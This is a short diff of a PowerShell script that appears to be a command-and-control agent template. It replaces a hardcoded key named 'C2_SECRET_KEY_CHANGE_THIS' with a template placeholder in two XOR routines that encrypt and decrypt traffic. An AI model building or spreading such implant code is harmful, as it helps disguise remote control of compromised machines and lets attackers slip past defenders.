@@ -5,7 +5,7 @@ $RECONNECT_DELAY = 5
 
 function Invoke-XOREncryption {
     param([string]$Data)
-    $key = [System.Text.Encoding]::UTF8.GetBytes('C2_SECRET_KEY_CHANGE_THIS')
+    $key = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
     $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
     $encrypted = New-Object byte[] $dataBytes.Length
     for ($i = 0; $i -lt $dataBytes.Length; $i++) {
@@ -16,7 +16,7 @@ function Invoke-XOREncryption {
 
 function Invoke-XORDecryption {
     param([string]$Data)
-    $key = [System.Text.Encoding]::UTF8.GetBytes('C2_SECRET_KEY_CHANGE_THIS')
+    $key = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
     $dataBytes = [Convert]::FromBase64String($Data)
     $decrypted = New-Object byte[] $dataBytes.Length
     for ($i = 0; $i -lt $dataBytes.Length; $i++) {
